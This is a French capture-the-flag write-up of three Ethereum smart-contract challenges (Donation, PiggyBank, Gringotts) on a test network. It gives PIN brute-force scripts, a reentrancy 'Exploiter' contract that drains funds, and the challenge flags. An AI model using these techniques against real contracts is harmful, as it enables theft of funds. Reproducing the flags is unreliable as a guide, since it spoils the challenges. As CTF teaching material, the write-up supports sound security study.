# [Santhacklaus 2019] - Golden rush



## Level 1 - Donation

> GoldenRush is a set of challenges based on the Ethereum Blockchain technology where you will have to exploit vulnerable Smart Contracts. Your goal is to steal the money that I sent on it !
> https://goldenrush.santhacklaus.xyz

Chaque challenge "Golden rush" est un smart contract à déployer sur la blockchain de test "Ropsten network".

### Mise en place de l'environnement

Pour faire les challenges de blockchain ou même ceux sur rootme, il faut ajouter l'extension "MetaMask" dans son navigateur:

> https://metamask.io/

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_93e6798b872dcd61bab4e65f60860744.png)

Lorsque l'extension est correctement installée, il faut créer un compte en suivant les étapes de "Create a wallet";

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_b55c44b8b1d46261b80f3c94c2d774be.png)

Quand le wallet est créé, il faut passer sur la blockchain "Ropsten Test Network", une blockchain de test, où les ETH n'ont aucunes valeurs.

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_63489c0d2cf2ce2c6c74a64553dae6b7.png)

Pour résoudre les différents challenges, il faudra au minimum 1 ETH dans le wallet. Pour récupérer des ETH:

> https://faucet.metamask.io/

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_a156d3e79a1cd08192253bce3c9350e3.png)

L'extension va apparaitre et il faudra accepter la transaction. Maintenant qu'il y a au moins 1 ETH dans le wallet, il est temps de valider le challenge.

### Etat des lieux

On commence donc sur la première étape, l'objectif est plutot simple: Voler l'argent du smartcontract.

Pour cela, le code Solidity du contrat est donné:

```javascript=
pragma solidity >=0.4.22 <0.6.0;

contract Donation {
    uint256 public funds;

    constructor() public payable{
        funds = funds + msg.value;
    }

    function() external payable {
        funds = funds + msg.value;
    }

    function getDonationsFromOwner(address _contractOwner) external {
        require(keccak256(abi.encodePacked(address(this)))==keccak256(abi.encodePacked(_contractOwner)));
        msg.sender.transfer(funds);
        funds = 0;
    }
}
```

En lançant l'instance, il y deux informations importantes:

1. L'adresse du contrat ;
2. L'Application Binary Interface (ABI) du contrat, cette ABI sert à décrire le contrat.

La fonction du contrat `getDonationsFromOwner(address _contractOwner)` attend donc une adresse en entrée, va vérifier qu'il s'agit bien de son adresse, et transférer les fonds.

### Transférer les ETH

Pour dialoguer avec les smartcontract, il existe le site: 

> https://www.myetherwallet.com

Qui s'interface vraiment bien avec l'extension MetaMask. Pour commencer à intéragir avec le smart contract du challenge, il faut lui donner l'adresse et son ABI:

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_520c88a92da1b46cfe27e63d511936df.png)

C'est à ce moment là que _myetherwallet_ sera en mesure de fournir une interface à l'utilisateur pour dialoguer avec le contrat. 

Pour valider l'épreuve, il suffit de fournir à la fonction `getDonationsFromOwner()` l'adresse du contrat: 

> 0x87f028059df3638b7184045682978Ed477637D72

Et cliquer sur "Write" pour écrire sur la blockchain. A ce moment, une popup MetaMask va apparaitre pour valider la transaction:

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_6ee5d2f438420272148c01e28dc0ade2.png)

Lorsque la transaction est validée et terminée (il est possible de suivre la progression via l'add on MetaMask), il est temps de récupérer le flag:

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_7f4d8466b1182475ac8d805393e35090.png)

### Flag

> SANTA{!!S0Lidi7y_BaSiCs!!}

## Level 2 - Piggybank

| Event        | Auteur   | Challenge     | Category | Points | Solves |
| ------------ | -------- | ------------- | -------- | ----|-- |
| Santhacklaus | ch3n4p4n | Golden rush 2 | Blockchain     |200| 29    |

> Steal the money stored in the contract.

### Etat des lieux

Comme pour le premier, on a accès au code Solidity du SmartContract:

```javascript
pragma solidity ^0.4.21;

contract PiggyBank {
    bool public isOwner = false;
    uint256 public funds;
    bytes32 private pinHash = 0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c;
    
    constructor() public payable {
        funds = funds + msg.value;
    }
    
    function() external payable {
        funds = funds + msg.value;
    }
    
    function unlockPiggyBank(uint256 pin) external {
        if((keccak256(abi.encodePacked(uint8(pin))) == pinHash)){
        isOwner = true;
        }    
    }

    function withdrawPiggyBank() external {
        require(isOwner == true);
        msg.sender.transfer(funds);
        isOwner = false;
        funds = 0;
    }
}
```

La fonction `withdrawPiggyBank()` est donc la fonction qui va transférer les fonds. Cependant, il faut que la variable `isOwner` soit à "True". Pour passer cette variable à "True" il faut exécuter la fonction `unlockPiggyBank(uint256 pin)` avec un pin correspondant au hash keccak256 de "PinHash".

### Méthode 1: Bruteforce all the things (Python mode)

Il faut savoir que keccak256 est un SHA3 256, sauf que le SHA3 de hashlib n'est pas du tout le même algo. Pour avoir la bonne fonction de hashage, il faut utiliser la lib python `pysha3`.

```python
#!/usr/bin/python3

import sha3
from ENO import *

def sha3_keccak(x):
    m = sha3.keccak_256()
    m.update(x)
    return m.hexdigest()

for i in range(256):
    tmp = sha3_keccak(ntos(i))
    if tmp == '7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c':
        print(i)
```

### Méthode 2: Bruteforce all the things (JS mode)

Au lieu d'éviter de se casser la tête en python pour savoir SHA3 de hashlib est le même que celui utilisé dans les smart contracts, on va prendre les librairies natives utilisé par Solidity.

Pour cela, on va télécharger ```web3-utils``` en faisant ```nmp i web3-utils``` contenant la fonction qui nous intéresse ici qui est ```soliditySha3```.

```javascript=
var utils = require("web3-utils");
var key = '0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c';
for (var i = 0; i < 256; i++) {
    var elt = utils.soliditySha3({type:'uint8',value: i}); 
    if (elt === key) {
	console.log("The key is:",i);
	return
    }
}
```


### Flag

> 213

Le pin secret est donc `213`, il ne reste plus qu'à vérifier l'état de la variable et transférer les fonds.

![](/lib/images/writeups/2019_santhacklaus/goldenrush/upload_bdbb3d1fd62b84123061b4f2dc0efa87.png)

> SANTA{N0_M0R3_B4D_R4ND0MN3SS_PL3AZ}

## Level 3 - Gringotts

| Event        | Auteur   | Challenge     | Category   | Points | Solves |
| ------------ | -------- | ------------- | ---------- | ------ | ------ |
| Santhacklaus | ch3n4p4n | Golden rush 3 | Blockchain | 300    | 18     |

> Steal the money stored in the contract.

### Etat des lieux

Voici le code du Smart Contract:

```javascript=
pragma solidity >=0.4.22 <0.6.0;

contract Gringotts {
  mapping (address => uint) public sorceryAllowance;
  uint public allowancePerYear;
  uint public startStudyDate;
  uint public numberOfWithdrawls;
  uint public availableAllowance;
  bool public alreadyWithdrawn;
    
    constructor() public payable {
        allowancePerYear = msg.value/10;     
        startStudyDate = now;
        availableAllowance = msg.value;
    }

    modifier isEligible() {
        require(now>=startStudyDate + numberOfWithdrawls * 365 days);
        alreadyWithdrawn = false;
        _;
    }

    function withdrawAllowance() external isEligible{
        require(alreadyWithdrawn == false);
        if(availableAllowance >= allowancePerYear){
         if (msg.sender.call.value(allowancePerYear)()){
            alreadyWithdrawn = true;
         }
        numberOfWithdrawls = numberOfWithdrawls + 1;
        sorceryAllowance[msg.sender]-= allowancePerYear;
        availableAllowance-=allowancePerYear;
        }
    }

  function donateToSorcery(address sorceryDestination) payable public{
    sorceryAllowance[sorceryDestination] += msg.value;
  }

  function queryCreditOfSorcery(address sorcerySource) view public returns(uint){
    return sorceryAllowance[sorcerySource];
  }
}

```
On remarque que la vulnérabilité va sûrement se retrouver dans la fonction ```withdrawAllowance()```. En effet, les fonctions ```donateToSorcery``` et ```queryCreditOfSorcery``` ne font rien de très foufou. En regardant le constructeur, on remarque l'allowance par an est de ```msg.value/10```.

L'objectif ici va tout simplement être de s'octroyer le maximum d'allowance que le contrat a. C'est à dire ```availableAllowance = msg.value;``` décrit dans le constructeur, en évitant bien sûr d'attendre 10 ans avant de tout récupérer.

Pour cela, on va effectuer une attaque de type Reentrancy. Ci-dessous un peu de documentation pour savoir comment ça marche:

* https://hackernoon.com/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302
* https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4

### Exploitation de la Reentrancy

Cette attaque de type reentrancy consiste donc à exécuter la commande ```msg.sender.call.value(allowancePerYear)()``` en boucle jusqu'à mettre à 0 la variable ```availableAllowance```. La commande étant un appel externe, la variable ```alreadyWithdrawn``` n'aura pas le temps de se mettre à ```true```, nous permettant ainsi de vider le contrat.

Pour réaliser cette attaque, on va utiliser le contrat suivant:

```javascript=
 contract Exploiter {
    address public challenge3Contract = 0x3C81bC083C26cbeEc62181EA9b4A5933a02eE22b;

    constructor() public payable {
        Gringotts contractChallenge3 = Gringotts(challenge3Contract);
    }
     
    function Exploit() public payable {
        contractChallenge3.withdrawAllowance();
    }
     
    function () public payable {
        contractChallenge3.withdrawAllowance();
    }
     
}
```

Ce contrat va nous permettre d'appeler une première fois la fonction vulnérable. Lorsque nous arrivons à l'instruction ```msg.sender.call.value(allowancePerYear)()```, la fonction de fallback (fonction sans nom dans notre contrat Exploiter) va entrer en jeu. 

En effet, l'instruction ```msg.sender.call.value(allowancePerYear)()``` va envoyer de l'ether du contrat vulnérable à notre contrat malicieux. Il faut savoir que la fonction de fallback est exécutée à chaque fois que le contrat reçoit de l'ether. Donc à chaque fois que ```msg.sender.call.value(allowancePerYear)()``` sera exécuté, la fonction de fallback sera exécuté, créant une boucle infini jusqu'au vidage du contrat.

Une fois la fonction Exploit() exécutée, il nous suffit just de récupérer le flag via l'interface.

### Le flag
>  Well done ! SANTA{R3eN7r4ncY_f0r_Th3_WiN} 
